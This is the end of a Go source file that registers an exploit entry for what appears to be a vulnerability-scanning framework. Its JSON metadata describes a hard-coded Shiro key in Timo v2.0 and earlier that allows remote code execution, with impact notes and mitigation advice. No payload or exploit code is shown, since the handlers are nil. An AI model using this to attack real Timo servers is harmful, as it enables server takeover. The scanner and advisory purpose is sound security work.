            "Description": "<p>Timo is a background management system based on SpringBoot.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Timo&nbsp;</span>v2.0 and earlier versions have a security vulnerability, which stems from the existence of hard coded shiro-key in the software, which can be used by attackers to execute arbitrary code.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://gitee.com/aun/Timo\">https://gitee.com/aun/Timo</a></p><p><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
